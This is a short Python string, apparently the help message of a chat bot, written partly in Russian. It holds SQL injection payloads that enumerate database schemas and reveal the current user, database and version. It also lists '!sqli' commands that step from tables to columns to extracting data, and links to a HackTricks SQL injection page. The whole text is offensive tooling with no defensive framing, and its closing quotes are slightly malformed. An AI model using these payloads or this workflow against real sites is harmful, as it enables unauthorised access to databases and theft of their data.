sqli_example = f'''Узнаем имя БД:
<code>(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)</code>

<code>(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()))</code>

<code>!sqli db_name</code> - узнаем таблицы
<code>!sqli db_name table_name</code> - узнаем столбцы
<code>!sqli db_name table_name column_name</code> - извлекаем данные
\nMore info: https://book.hacktricks.xyz/pentesting-web/sql-injection', disable_web_page_preview=True'''
